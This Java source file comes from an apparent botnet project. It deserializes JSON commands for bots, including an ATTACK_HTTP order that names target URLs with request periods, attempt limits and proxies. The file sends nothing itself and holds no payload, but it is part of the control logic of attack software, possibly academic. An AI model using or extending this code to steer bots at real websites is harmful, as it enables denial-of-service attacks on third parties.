/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.command.serial;

import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.string.TemplateEngine;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.CommandScope;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;

import java.io.IOException;
import java.net.URL;
import java.util.*;

/**
 * This class realizes the JSON deserializer for {@link BotCommand}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandDeserializer extends StdDeserializer<BotCommand> {

  /**
   * The singleton of {@link BotCommandDeserializer}.
   */
  private static BotCommandDeserializer instance;

  /**
   * Returns the singleton of {@link BotCommandDeserializer}.
   * @return the singleton.
   */
  public static BotCommandDeserializer getInstance() {
    if (instance == null) {
      instance = new BotCommandDeserializer();
    }
    return instance;
  }

  /**
   * Initializes the singleton of {@link BotCommandDeserializer}.
   */
  private BotCommandDeserializer() {
    super((Class<BotCommand>) null);
  }

  @Override
  public BotCommand deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
    JsonNode node = parser.getCodec().readTree(parser);

    if (!node.has("command")) {
      throw new IOException("Cannot read command scope (missing).");
    }

    CommandScope scope;
    try {
      scope = CommandScope.valueOf(node.get("command").asText());
    } catch (IllegalArgumentException exc) {
      throw new IOException("Cannot read command scope (malformed).");
    }

    BotCommand cmd = new BotCommand(scope);

    if (cmd.getScope().isWithParams()) {

      switch (cmd.getScope()) {

        case RESTART:
          if (!node.has("resource")) {
            throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
          }
          final String resource = TemplateEngine.getInstance().replace(node.get("resource").asText());
          cmd.getParams().put("resource", resource);
          break;

        case UPDATE:
          if (!node.has("settings")) {
            throw new IOException("Cannot read parameter [settings] for scope [UPDATE] (missing)");
          }
          Map<String,String> settings = new HashMap<>();
          node.get("settings").fields().forEachRemaining(e -> {
            String k = e.getKey();
            String v = e.getValue().asText();
            settings.put(k, v);
          });
          cmd.getParams().put("settings", settings);
          break;

        case SLEEP:
          if (!node.has("timeout")) {
            throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
          }
          final Duration sleepTimeout = Duration.valueOf(node.get("timeout").asText());
          cmd.getParams().put("timeout", sleepTimeout);
          break;

        case SHUTDOWN:
          if (!node.has("timeout")) {
            throw new IOException("Cannot read parameter [timeout] for scope [SHUTDOWN] (missing)");
          }
          final Duration shutdownTimeout = Duration.valueOf(node.get("timeout").asText());
          cmd.getParams().put("timeout", shutdownTimeout);
          break;

        case ATTACK_HTTP:
          if (!node.has("method") || !node.has("targets")) {
            throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
          }
          final HttpMethod httpMethod = HttpMethod.from(node.get("method").asText());
          final List<HttpTarget> httpTargets = parseTargets(node.get("targets"));
          cmd.getParams().put("method", httpMethod);
          cmd.getParams().put("targets", httpTargets);
          break;

        default:
          break;
      }
    }

    return cmd;
  }

  /**
   * Parses a list of {@link HttpTarget} from a JSON node.
   * @param node the JSON node to parse.
   * @return the parsed list of {@link HttpTarget}.
   */
  private static List<HttpTarget> parseTargets(JsonNode node) throws IOException {
    List<HttpTarget> targets = new ArrayList<>();
    Iterator<JsonNode> iter = node.elements();
    while (iter.hasNext()) {
      JsonNode n = iter.next();
      if (!n.hasNonNull("url") ||
          !n.hasNonNull("period") ||
          !n.hasNonNull("maxAttempts")) {
        continue;
      }
      final String url = n.get("url").asText();
      final Interval period = Interval.valueOf(n.get("period").asText());
      final long maxAttempt = n.get("maxAttempts").asLong();
      HttpProxy proxy = null;
      if (n.hasNonNull("proxy")) {
        proxy = HttpProxy.valueOf(n.get("proxy").asText());
      }
      HttpTarget target = new HttpTarget(new URL(url), period, maxAttempt, proxy);
      targets.add(target);
    }
    return targets;
  }
}